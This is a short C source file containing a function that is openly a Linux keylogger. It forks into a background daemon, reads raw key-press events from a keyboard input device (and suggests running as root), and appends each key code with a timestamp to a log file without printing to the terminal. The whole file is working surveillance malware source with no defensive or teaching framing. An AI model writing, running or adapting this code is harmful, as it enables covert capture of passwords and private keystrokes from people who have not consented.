#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <time.h>
#include <string.h>

void keylogger(const char *logfile) {
    const char *device = "/dev/input/event2"; // Change this to your keyboard's event file
    struct input_event event;

    pid_t pid = fork();
    if (pid < 0) {
        perror("Error forking process");
        return;
    }
    if (pid > 0) {
        // Parent process exits, allowing child to run in background
        printf("Keylogger running in the background. PID: %d\n", pid);
        return;
    }

    // Child process (daemon)
    setsid();  // Create a new session
    int fd = open(device, O_RDONLY);
    if (fd == -1) {
        perror("Error opening device file");
        printf("Ensure you have the correct permissions or run as root.\n");
        exit(EXIT_FAILURE);
    }

    FILE *log = fopen(logfile, "a");
    if (!log) {
        perror("Error opening log file");
        close(fd);
        exit(EXIT_FAILURE);
    }

    // Add a timestamp at the start of the session
    time_t now = time(NULL);
    fprintf(log, "Session started: %s\n", ctime(&now));
    fflush(log);

    // Run the keylogger in the background, without printing anything to the terminal
    while (1) {
        if (read(fd, &event, sizeof(struct input_event)) > 0) {
            if (event.type == EV_KEY && event.value == 1) { // Key press event
                // Log the key press event to the log file
                fprintf(log, "Key %d pressed at %ld\n", event.code, time(NULL));
                fflush(log);  // Ensure data is written immediately
            }
        } else {
            // Debug: Print an error message if no data is read from the input file
            perror("Error reading from device file");
        }
    }

    fclose(log);
    close(fd);
}

